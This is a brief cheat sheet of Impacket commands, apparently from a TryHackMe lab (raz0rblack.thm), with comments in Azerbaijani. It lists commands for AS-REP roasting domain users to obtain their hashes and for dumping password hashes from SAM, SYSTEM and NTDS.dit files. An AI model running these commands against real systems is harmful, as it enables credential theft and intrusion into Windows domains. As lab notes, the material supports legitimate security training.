# Impacket


`python GetNPUsers.py raz0rblack.thm/ -usersfile /tmp/user.txt -dc-ip 10.10.161.127`  - bruteforce atak edib useri tapir hashi ile birge

#### Dumping Hashes
`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  

#### Extract the Hashes
`impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL`
